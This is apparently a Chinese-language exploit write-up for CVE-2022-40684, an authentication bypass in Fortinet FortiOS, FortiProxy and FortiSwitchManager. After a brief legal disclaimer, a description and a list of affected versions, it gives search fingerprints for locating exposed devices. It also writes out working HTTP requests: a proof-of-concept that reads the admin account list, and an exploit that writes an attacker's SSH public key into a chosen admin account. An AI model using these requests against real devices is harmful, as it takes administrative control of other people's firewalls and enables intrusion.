### CVE-2022-40684

### 遵纪守法：

任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益 。



### 漏洞简介：

Fortinet（飞塔）是一家全球知名的网络安全产品和安全解决方案提供商，其产品包括防火墙、防病毒软件、入侵防御系统和终端安全组件等。在受影响的FortiOS、FortiProxy 和 FortiSwitchManager产品的管理界面中，可以通过使用备用路径或通道绕过身份验证，并在未经认证的情况下通过特制的HTTP或HTTPS请求对管理界面进行操作。 



###  **风险等级** ：

 高



###  影响版本：

FortiOS 版本 7.2.0 - 7.2.1

FortiOS 版本 7.0.0 - 7.0.6

FortiProxy 版本 7.2.0

FortiProxy 版本 7.0.0 - 7.0.6

FortiSwitchManager 版本 7.2.0

FortiSwitchManager 版本 7.0.0



### 资产确定：

 title="FortiProxy“ 

title="FortiGate" 



### 漏洞复现：

#### poc

![image](https://user-images.githubusercontent.com/105833193/198500176-e3bff214-6c7f-49ff-8dfc-e7e7fb92ede8.png)


```http
GET /api/v2/cmdb/system/admin HTTP/1.1
Host: 目标
User-Agent: Node.js
Accept-Encoding: gzip, deflate
Accept: */*
Hosts: 127.0.0.1:9980
Forwarded: by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=
X-Forwarded-Vdom: root
```



#### EXP


![image](https://user-images.githubusercontent.com/105833193/198500212-b6e24e77-ccd9-4f3f-ab2d-8a055e55fbf9.png)



```http
PUT /api/v2/cmdb/system/admin/用户名 HTTP/2
Host: 目标
User-Agent: Report Runner
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
Content-Length: 589
Content-Type: application/json

{"ssh-public-key1": "\"公钥内容\""}
```

![image](https://user-images.githubusercontent.com/105833193/198500226-07402a5b-6806-402e-b511-ce6e06dddeab.png)

![image](https://user-images.githubusercontent.com/105833193/198500235-7a932148-7fb9-46b9-8a40-58cd44b8f50c.png)



